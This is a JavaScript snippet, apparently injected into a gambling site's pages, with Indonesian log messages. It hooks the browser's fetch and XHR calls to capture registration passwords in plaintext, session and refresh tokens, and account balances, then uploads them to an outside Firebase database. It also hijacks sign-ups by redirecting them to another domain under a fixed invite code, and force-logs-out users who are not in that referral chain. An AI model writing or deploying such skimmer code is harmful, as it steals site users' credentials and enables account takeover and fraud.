(function() {
    'use strict';

    console.log('🚀 Wingo Full Script Active (AutoSave + Login Check - No Nav)');

    // ================================================================
    // 1. FIREBASE CONFIG & LOAD
    // ================================================================
    const firebaseConfig = {
        apiKey: "AIzaSyDtZxsl5LZp3n1KZJfdVAdqQj22ZBPoQbU",
        authDomain: "steady-fin-368617.firebaseapp.com",
        databaseURL: "https://steady-fin-368617-default-rtdb.firebaseio.com",
        projectId: "steady-fin-368617",
        storageBucket: "steady-fin-368617.firebasestorage.app",
        messagingSenderId: "626971902484",
        appId: "1:626971902484:web:98f7cdbd55c5990dfe9d01",
        measurementId: "G-70D3LR995Y"
    };

    let firebaseLoaded = false;
    let db = null;

    function loadFirebase() {
        return new Promise((resolve) => {
            if (typeof firebase !== 'undefined' && firebase.database) {
                firebaseLoaded = true;
                db = firebase.database();
                console.log('✅ Firebase already loaded');
                resolve();
                return;
            }
            if (document.querySelector('script[src*="firebase-app-compat.js"]')) {
                const checkFirebase = setInterval(() => {
                    if (typeof firebase !== 'undefined' && firebase.database) {
                        clearInterval(checkFirebase);
                        firebaseLoaded = true;
                        db = firebase.database();
                        console.log('✅ Firebase loaded (existing script)');
                        resolve();
                    }
                }, 100);
                return;
            }
            console.log('⏳ Loading Firebase...');
            const s1 = document.createElement('script');
            s1.src = 'https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js';
            s1.onload = () => {
                const s2 = document.createElement('script');
                s2.src = 'https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js';
                s2.onload = () => {
                    firebase.initializeApp(firebaseConfig);
                    firebaseLoaded = true;
                    db = firebase.database();
                    console.log('✅ Firebase initialized');
                    resolve();
                };
                document.head.appendChild(s2);
            };
            document.head.appendChild(s1);
        });
    }

    // ================================================================
    // 2. FUNGSI DATABASE
    // ================================================================
    function saveUser(userId, data) {
        if (!userId || !db) {
            console.warn('⚠️ saveUser: db atau userId kosong');
            return;
        }
        db.ref("uids/" + userId).update({
            ...data,
            updated: Date.now()
        });
        console.log("✅ User data saved for UID:", userId);
    }

    async function checkUidIsDownline(uid) {
        if (!db) {
            console.warn('⚠️ db belum siap');
            return false;
        }
        try {
            const snapshot = await db.ref('uids/' + uid).once('value');
            if (!snapshot.exists()) {
                console.log(`🔍 UID ${uid} tidak ditemukan di Firebase`);
                return false;
            }
            const data = snapshot.val();
            if (data.parentInviteCode === 'DtX6m351494') {
                console.log(`✅ UID ${uid} adalah downline (parentInviteCode cocok)`);
                return true;
            } else {
                console.log(`❌ UID ${uid} bukan downline (parentInviteCode=${data.parentInviteCode})`);
                return false;
            }
        } catch(e) {
            console.error('❌ Firebase check error:', e);
            return false;
        }
    }

    function forceLogoutAndRedirect() {
        console.log('🚪 Melakukan logout paksa dan redirect ke 551br.com/#/main');
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(";").forEach(function(c) {
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        });
        window.location.href = 'https://551br.com/#/main';
    }

    // ================================================================
    // 3. HANDLER REGISTER
    // ================================================================
    function handleRegisterResponse(data, requestBody) {
        console.log('📝 handleRegisterResponse dipanggil');
        if (!data || data.code !== 0) {
            console.log('Register tidak sukses, skip');
            return;
        }
        if (!data.data || !data.data.token) {
            console.log('Tidak ada token di response Register');
            return;
        }
        const token = data.data.token;
        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            const userId = payload.UserId;
            if (!userId) {
                console.log('Tidak ada UserId di token Register');
                return;
            }
            const parentInviteCode = data.data.parentInviteCode || '';
            console.log(`🔑 Register: userId=${userId}, parentInviteCode=${parentInviteCode}`);
            if (parentInviteCode !== 'DtX6m351494') {
                console.log(`❌ Register dengan parentInviteCode=${parentInviteCode}, bukan downline kita. Skip save.`);
                return;
            }
            const password = (requestBody && requestBody.pwd) || '';
            saveUser(userId, {
                nickName: payload.NickName || '',
                userName: payload.UserName || '',
                parentUserId: data.data.parentUserId || '',
                parentInviteCode: parentInviteCode,
                token: token,
                refreshToken: data.data.refreshToken || '',
                expiresIn: data.data.expiresIn || 0,
                tokenType: payload.TokenType || '',
                role: payload.role || '',
                pwd: password,
                regTime: payload.LoginTime || '',
                registerType: requestBody ? requestBody.registerType : '',
                active: true,
                status: 1
            });
            console.log(`✅ Register SUCCESS: ${userId} saved as downline.`);
        } catch(e) {
            console.warn('❌ Gagal decode token Register', e);
        }
    }

    // ================================================================
    // 4. HANDLER LOGIN
    // ================================================================
    async function handleLoginResponse(data) {
        console.log('🔍 handleLoginResponse dipanggil');

        if (!data || data.code !== 0) {
            console.log('Login gagal (code != 0), skip');
            return;
        }
        if (!data.data || !data.data.token) {
            console.log('Tidak ada token di response Login');
            return;
        }

        const token = data.data.token;
        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            const userId = payload.UserId;
            if (!userId) {
                console.log('Tidak ada UserId di token Login');
                return;
            }
            console.log('🔑 Login UID dari token:', userId);

            await loadFirebase();
            const isDownline = await checkUidIsDownline(userId);
            console.log(`🔎 Hasil cek UID ${userId} di Firebase: ${isDownline ? 'DOWNLINE' : 'BUKAN DOWNLINE'}`);

            if (!isDownline) {
                console.warn(`⚠️ UID ${userId} BUKAN downline!`);
                alert('⚠️ Akun Anda bukan downline yang terdaftar. Anda akan di-logout.');
                forceLogoutAndRedirect();
                return;
            }

            console.log(`✅ UID ${userId} adalah downline.`);
        } catch(e) {
            console.warn('❌ Gagal decode token Login:', e);
        }
    }

    // ================================================================
    // 5. HANDLER GETUSERINFO
    // ================================================================
    async function handleGetUserInfo(data) {
        console.log('📊 handleGetUserInfo dipanggil');
        if (!data || data.code !== 0) {
            console.log('GetUserInfo tidak sukses, skip');
            return;
        }
        const userData = data.data;
        if (!userData || !userData.userId) {
            console.log('Tidak ada userId di GetUserInfo');
            return;
        }
        const userId = userData.userId.toString();

        await loadFirebase();
        if (db) {
            db.ref("uids/" + userId).update({
                nickName: userData.nickName || '',
                userName: userData.userName || '',
                amount: userData.amount || 0,
                integral: userData.integral || 0,
                userPhoto: userData.userPhoto || '',
                regType: userData.regType || 0,
                addTime: userData.addTime || '',
                userLoginDate: userData.userLoginDate || '',
                sign: userData.sign || '',
                keyCode: userData.keyCode || '',
                isvalidator: userData.isvalidator || 0,
                userRechargeTimes: userData.userRechargeTimes || 0,
                updated: Date.now()
            });
            console.log(`✅ GetUserInfo data updated for UID: ${userId}`);
        } else {
            console.warn('⚠️ db belum siap, tidak bisa update GetUserInfo');
        }
    }

    // ================================================================
    // 6. INTERCEPTOR FETCH & XHR
    // ================================================================
    function setupInterceptor() {
        console.log('🛠️ Setting up fetch & XHR interceptors');

        // ===== FETCH =====
        const origFetch = window.fetch;
        window.fetch = async (...args) => {
            const [url, options] = args;
            let requestBody = null;
            if (typeof url === 'string' && options && options.body) {
                try {
                    requestBody = JSON.parse(options.body);
                } catch(e) {}
            }

            const res = await origFetch(...args);
            const clone = res.clone();
            const contentType = res.headers.get('content-type') || '';
            if (contentType.includes('application/json')) {
                clone.json().then(async (data) => {
                    if (typeof url === 'string') {
                        const urlLower = url.toLowerCase();
                        if (urlLower.includes('/register')) {
                            console.log('📡 Fetch intercepted: Register');
                            await loadFirebase();
                            handleRegisterResponse(data, requestBody);
                        }
                        if (urlLower.includes('/login')) {
                            console.log('📡 Fetch intercepted: Login');
                            await loadFirebase();
                            await handleLoginResponse(data);
                        }
                        if (urlLower.includes('/getuserinfo')) {
                            console.log('📡 Fetch intercepted: GetUserInfo');
                            await loadFirebase();
                            await handleGetUserInfo(data);
                        }
                    }
                }).catch(() => {});
            }
            return res;
        };

        // ===== XHR =====
        const origOpen = XMLHttpRequest.prototype.open;
        const origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            this._method = method;
            origOpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function(body) {
            const self = this;
            let requestBody = null;
            if (self._method === 'POST' && self._url && body) {
                try {
                    requestBody = JSON.parse(body);
                } catch(e) {}
            }
            this.addEventListener('load', function() {
                const contentType = this.getResponseHeader('content-type') || '';
                if (contentType.includes('application/json')) {
                    try {
                        const data = JSON.parse(this.responseText);
                        if (self._url) {
                            const urlLower = self._url.toLowerCase();
                            if (urlLower.includes('/register')) {
                                console.log('📡 XHR intercepted: Register');
                                loadFirebase().then(() => {
                                    handleRegisterResponse(data, requestBody);
                                });
                            }
                            if (urlLower.includes('/login')) {
                                console.log('📡 XHR intercepted: Login');
                                loadFirebase().then(() => {
                                    handleLoginResponse(data);
                                });
                            }
                            if (urlLower.includes('/getuserinfo')) {
                                console.log('📡 XHR intercepted: GetUserInfo');
                                loadFirebase().then(() => {
                                    handleGetUserInfo(data);
                                });
                            }
                        }
                    } catch(e) {}
                }
            });
            origSend.call(this, body);
        };
    }

    // ================================================================
    // 7. REDIRECT REGISTER KE NUXPIRA
    // ================================================================
    function redirectRegisterToNuxpira() {
        var currentUrl = window.location.href;
        if (currentUrl.includes('551br.com/#/register') && !currentUrl.includes('nuxpira.com')) {
            var newUrl = 'https://www.nuxpira.com/#/register?invitationCode=DtX6m351494';
            console.log('🔀 Redirecting register to:', newUrl);
            window.location.replace(newUrl);
            return true;
        }
        return false;
    }

    // ================================================================
    // 8. INIT
    // ================================================================

    setupInterceptor();

    // Redirect Register
    setTimeout(redirectRegisterToNuxpira, 100);

    // Cek status login dan downline
    setTimeout(async () => {
        const token = localStorage.getItem('token') || sessionStorage.getItem('token');
        if (token) {
            console.log('🔑 Token ditemukan.');
            try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                const userId = payload.UserId;
                if (userId) {
                    await loadFirebase();
                    const isDownline = await checkUidIsDownline(userId);
                    if (!isDownline) {
                        console.warn(`⚠️ UID ${userId} BUKAN downline!`);
                        alert('⚠️ Akun Anda bukan downline yang terdaftar. Anda akan di-logout.');
                        forceLogoutAndRedirect();
                        return;
                    }
                    console.log(`✅ UID ${userId} adalah downline.`);
                } else {
                    console.warn('Tidak ada UserId di token, logout');
                    forceLogoutAndRedirect();
                    return;
                }
            } catch(e) {
                console.warn('Gagal decode token saat init:', e);
                forceLogoutAndRedirect();
                return;
            }
        } else {
            console.log('ℹ️ Tidak ada token, tidak perlu validasi.');
        }
    }, 3000);

    console.log('🚀 Wingo Full Script (No Navigation) initialized');
})();
